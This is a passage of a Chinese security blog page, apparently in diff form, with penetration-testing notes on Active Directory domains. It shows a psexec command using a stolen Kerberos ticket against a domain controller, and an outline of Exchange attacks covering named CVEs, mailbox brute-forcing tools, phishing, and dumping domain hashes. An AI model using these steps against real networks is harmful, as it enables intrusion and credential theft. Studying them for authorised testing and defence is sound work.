+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">expoet KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 psexec.py DC02.nsfocus.cn -no-pass -k -dc-ip 192.168.122.1</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><p>exchange在内网中一般具备很高的权限（WriteACL）将域普通用户赋予DCSync权限，进而到处域内hash，拿下域控</p>
+<h5 id="发现exchange服务"><a href="#发现exchange服务" class="headerlink" title="发现exchange服务"></a>发现exchange服务</h5><p>SPN</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T 域名 -F -Q */* | findstr exchange</span><br></pre></td></tr></table></figure></div>
+
+<p>web探测</p>
+<p>获取exchange版本</p>
+<p>通过web的网页源代码中可以以确定版本号</p>
+<p>漏洞利用</p>
+<p>CVE-2020-0688</p>
+<p>proxylogon（CVE-2021-26855&#x2F;CVE-2021-27065）</p>
+<p>proxyshell（CVE-2021-34473）</p>
+<p>proxyNotShell（cve-2022-41040 and CVE-2022-41082）</p>
+<p>暴力破解邮箱账号</p>
+<p>相关工具</p>
+<p>mallsniper</p>
+<p>EBurst</p>
+<p>获取到一个邮箱账号</p>
+<p>导出其他用户的邮箱—在暴力破解</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/grayddq/EBurst" >https://github.com/grayddq/EBurst <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  速度快，有误差</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper" >https://github.com/dafthack/MailSniper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  比较稳定，速度慢</p>
+<p>社工钓鱼</p>
+<p>口令复用&#x2F;hash传递</p>
+<p>exchange的后渗透</p>
+<p>翻看重点人员（运维人员&#x2F;IT部门等）邮箱—访问其他用户的邮箱—添加fullaccess（完全访问）权限—赋予一个域用户对另一个用户邮箱查看、添加和删除邮箱内容的权限</p>
+<p>导出详情通讯录—组织架构、职位、邮箱手机号—定位运维部门、运维人员、社工钓鱼</p>
+<p>堡垒机、Vcenter等集权系统拿下主机</p>
+<p>拿下域控之后的常规操作</p>
+<p>导出域内hash</p>
+<p>导出DNS相关信息—-获取对应机器的IP</p>
+<p>导出域内详细信息(BloodHound、csvde–域控上)</p>
+<p>定位运维人、核心人员、运维部门等</p>
+<p>ADExplore.exe—连接域控ldap</p>
+<p>域控AD用户和计算机</p>
+<p>邮箱（运维部-信息管理员xxx发送的邮箱、看详细通讯录）</p>
+<p>钉钉、企业微信、微信（聊天记录、组织架构）</p>
+<p>查看域用户登陆过哪些机器—导出域控日志、看域用户登陆日志—wevtutil+logparser—定位到机器后登陆翻看文件</p>
+<p>找使用域认证的相关系统—堡垒机、云平台、云桌面</p>
+<p>知识点总结</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg" >https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 域渗透</li>
+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2024-02-29 21:33:17</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2024-02-29 21:34:25
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2024/02/29/域渗透/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2024/02/29/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">内网信息收集</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E7%8E%AF%E5%A2%83/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">权限维持---域环境</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">域渗透</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%80%E5%A4%84%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="nav-text">所处内网环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="nav-text">工作组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E5%9F%9F%E5%86%85"><span class="nav-text">在域内</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">域信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7LDAP"><span class="nav-text">连接域控LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="nav-text">用户凭据收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BloodHound"><span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">域内横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTH"><span class="nav-text">PTH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E7%BB%A7"><span class="nav-text">中继</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E9%81%93ntlm%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9C%89%E7%9A%84%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="nav-text">知道ntlm如何修改原有的账户密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87HASH%E7%99%BB%E9%99%86RDP%E2%80%94%E8%A7%A3%E4%B8%8D%E5%87%BAhash%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-text">通过HASH登陆RDP—解不出hash怎么办</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E6%96%B9%E5%BC%8F"><span class="nav-text">攻击域控方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-text">委派</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM"><span class="nav-text">NTLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exchange"><span class="nav-text">exchange</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
